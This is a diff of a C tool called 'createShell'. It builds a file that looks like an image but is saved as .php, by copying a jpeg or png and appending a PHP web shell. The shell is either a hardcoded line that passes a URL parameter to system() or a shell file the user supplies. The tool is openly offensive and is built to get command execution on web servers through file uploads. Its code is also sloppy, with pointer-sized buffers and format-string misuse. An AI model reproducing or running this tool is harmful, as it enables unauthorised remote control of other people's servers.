@@ -29,6 +29,7 @@ SOFTWARE.
 #include <stdlib.h>
 #include <string.h>
 #define shell "<?php if($_GET){system($_GET['cmd']);}?>"
+#define read(buffer, size, var, wrvar) while(fgets(buffer, sizeof(size), var) != NULL){fprintf(wrvar, buffer);}
 
 void banner(void){
 	printf("\n\n---------------------------------------------\n\n");
@@ -47,7 +48,8 @@ void fatal(char *msng){
 int main(int argc, char *argv[]){
 	if(argc < 3){
 		banner();
-		fatal("Modo de Uso: root@localhost~# ./createShell imagem.php output.php");
+		fatal("Modo de Uso: root@localhost~# ./createShell imagem.*(jpeg, png) output.php");
+		fatal("Or: root@localhost~# ./createShell imagem.*(jpeg, png) output.php shell.php");
 		exit(0);
 
 	}else{
@@ -58,7 +60,7 @@ int main(int argc, char *argv[]){
 
 		if (img == NULL){
 			banner();
-			fatal("\nArquivo Nao Encontrado!");
+			fatal("\nImagem Nao Encontrada!");
 			fclose(img);
 			fclose(output);
 			exit(0);
@@ -67,17 +69,13 @@ int main(int argc, char *argv[]){
 
 			output = fopen(argv[2], "wb");
 			img = fopen(argv[1], "rb");
-			while(fgets(size_i, sizeof(img), img) != NULL){
-				fprintf(output, size_i);
-			}
+			read(size_i, img, img, output);
+
 			if(argc > 3){
 
 				FILE *open_shell = fopen(argv[3], "rb");
 				char size_sh[sizeof(open_shell)];
-
-				while(fgets(size_sh, sizeof(open_shell), open_shell) != NULL){
-					fprintf(output, size_sh);
-				}
+				read(size_sh, open_shell, open_shell, output);
 				fclose(open_shell);
 			}else{
 				fprintf(output, shell);
